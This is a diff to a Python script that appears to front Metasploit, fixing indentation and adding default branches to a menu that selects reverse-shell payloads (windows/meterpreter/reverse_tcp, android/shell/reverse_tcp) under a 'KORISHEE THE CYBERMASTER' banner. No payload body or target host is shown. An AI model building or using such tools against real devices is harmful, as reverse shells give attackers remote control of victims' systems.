@@ -57,6 +57,11 @@ def select_platform():
 
 
 
+import os
+import time
+from colorama import Fore, Style
+
+# Rest of your code remains the same
 
 def select_payload(platform):
     print_with_animation(f"Available payloads for {platform}:")
@@ -67,10 +72,10 @@ def select_payload(platform):
         if payload_choice == '1':
             return "windows/meterpreter/reverse_tcp"
         elif payload_choice == '2':
-       	    return "windows/shell/reverse_tcp"
-    else:
-        print_with_animation(f"{Fore.RED}Invalid choice.Defaulting to android/meterpreter/reverse_tcp.")
-        return "android/meterpreter/reverse_tcp"
+            return "windows/shell/reverse_tcp"
+        else:
+            print_with_animation(f"{Fore.RED}Invalid choice. Defaulting to android/meterpreter/reverse_tcp.")
+            return "android/meterpreter/reverse_tcp"
     elif platform == "android":
         print_with_animation(f"{Fore.GREEN}1. android/meterpreter/reverse_tcp")
         print_with_animation("2. android/shell/reverse_tcp")
@@ -79,9 +84,15 @@ def select_payload(platform):
             return "android/meterpreter/reverse_tcp"
         elif payload_choice == '2':
             return "android/shell/reverse_tcp"
+        else:
+            print_with_animation(f"{Fore.RED}Invalid choice. Defaulting to android/meterpreter/reverse_tcp.")
+            return "android/meterpreter/reverse_tcp"
     else:
-    	print_with_animation(f"{Fore.RED}Invalid choice.Defaulting to android/meterpreter/reverse_tcp.")
+        print_with_animation(f"{Fore.RED}Invalid choice. Defaulting to android/meterpreter/reverse_tcp.")
         return "android/meterpreter/reverse_tcp"
+
+# Rest of your code remains the same
+
 
 def generate_payload():
     print_colored_figlet_text("KORISHEE THE CYBERMASTER", Fore.GREEN)
